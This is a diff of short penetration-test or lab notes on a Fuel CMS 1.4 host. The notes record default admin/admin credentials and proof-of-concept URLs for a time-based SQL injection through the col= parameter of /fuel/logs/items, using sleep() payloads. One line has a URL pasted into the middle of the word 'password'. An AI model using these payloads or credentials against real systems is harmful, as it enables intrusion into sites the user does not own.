@@ -9,13 +9,13 @@
 - robots.txt (disallows /fuel)
 - offline
 ## Vulnerabilities
-http://[[IP]] directly exposes username and phttp://10.67.173.54/fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date%20and%20(select%20*%20from(select(sleep(10)))a)&&fuel_inline=0assword to acces /fuel as admin
+http://10.67.173.54 directly exposes username and phttp://10.67.173.54/fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date%20and%20(select%20*%20from(select(sleep(10)))a)&&fuel_inline=0assword to acces /fuel as admin
 username = admin
 password = admin
 ## Exploit
 -- 1 --
 In Fuel CMS 1.4 there's a SQLI in the query param col= in
-http://[IP]/fuel/logs
+http://10.67.173.54/fuel/logs
 when a type is entered
 ``` PoC
 http://127.0.0.1/fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date and (select * from(select(sleep(1)))a)&fuel_inline=0
